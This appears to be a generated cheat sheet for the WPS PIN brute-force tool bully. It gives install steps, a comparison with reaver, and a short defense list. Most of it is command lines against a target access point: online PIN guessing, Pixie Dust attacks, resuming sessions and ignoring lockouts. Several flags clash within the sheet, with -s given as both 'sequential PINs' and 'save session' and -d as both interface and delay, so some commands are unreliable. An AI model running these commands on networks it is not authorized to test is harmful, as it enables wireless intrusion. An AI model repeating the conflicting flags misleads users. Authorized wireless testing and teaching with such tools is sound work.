---
title: bully
category: credential_access
subcategory: wifi_credential
phase: 08
mitre_attack: TA0006
tags:
  - wireless
  - wps
  - pin
  - brute_force
  - pixie_dust
difficulty: intermediate
os: linux
install: sudo apt install bully
github: https://github.com/aanarchyy/bully
related:
  - reaver
  - pixiewps
  - wash
  - wifite
---

# bully

## Chapter 1: Overview

**bully** is a WPS brute force attack tool that implements the online brute force attack against WiFi Protected Setup (WPS) PIN numbers. It features a Pixie Dust implementation and various optimization options.

### Key Features

- **Online WPS brute force**: Systematic PIN guessing
- **Pixie Dust attack**: Offline PIN computation
- **Session persistence**: Save and resume attacks
- **Rate limiting**: Handles WPS lockouts
- **Multiple interfaces**: Support for various wireless cards

### Bully vs Reaver

| Feature | Bully | Reaver |
|---------|-------|--------|
| Speed | Generally faster | Slower but stable |
| Lock handling | Better | Basic |
| Pixie Dust | Built-in | Requires pixiewps |
| Session save | Yes | Yes |
| Stability | Good | Very good |

---

## Chapter 2: Installation & Setup

```bash
sudo apt update && sudo apt install bully
```

### Compile from Source

```bash
git clone https://github.com/aanarchyy/bully.git
cd bully/src
make
sudo make install
```

---

## Chapter 3: Basic Usage

### Scan for WPS Networks

```bash
wash -i wlan0mon
```

### Start PIN Attack

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -i wlan0mon
```

### Verbose Output

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -i wlan0mon -v 3
```

### Specify Interface

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon
```

---

## Chapter 4: Attack Options

### Set Pin Timeout

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -t 10
```

### Set Max Attempts

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -n 50
```

### Sequential PINs Only

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -s
```

### Use P1-P2 Method

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -p
```

---

## Chapter 5: Pixie Dust Attack

### Quick Pixie Dust

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -K
```

### Pixie Dust with Small DH

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -K -S
```

### Capture and Compute

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -K -v 3
```

---

## Chapter 6: Advanced Features

### Save Session

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -s session_file
```

### Resume Session

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -r session_file
```

### Ignore Lock State

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -L
```

### Set PIN Delay

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -d 5
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Quick WPS Test

```bash
wash -i wlan0mon
bully -b TARGET_BSSID -c CHANNEL -i wlan0mon -v 3
```

### Scenario 2: Pixie Dust Attack

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -K -v 3
```

### Scenario 3: Persistent Attack

```bash
bully -b AA:BB:CC:DD:EE:FF -c 6 -s session1 -n 100 -L
```

---

## Chapter 8: Mitigation & Defense

**Critical defenses:**

- Disable WPS on all access points
- Use WPA3-SAE authentication
- Enable WPS lockout protection
- Monitor for PIN enumeration attempts
- Regular firmware updates
- Consider enterprise authentication

---

## Resources

- [bully GitHub](https://github.com/aanarchyy/bully)
- [WPS Attack Guide](https://www.aircrack-ng.org/doku.php?id=bully)
- [WiFi Security](https://www.wi-fi.org/discover-wi-fi/security)
- [OffSec PEN-210 Course](https://www.offsec.com/courses/pen-210/)

---

*Generated for educational purposes in authorized security testing environments only.*
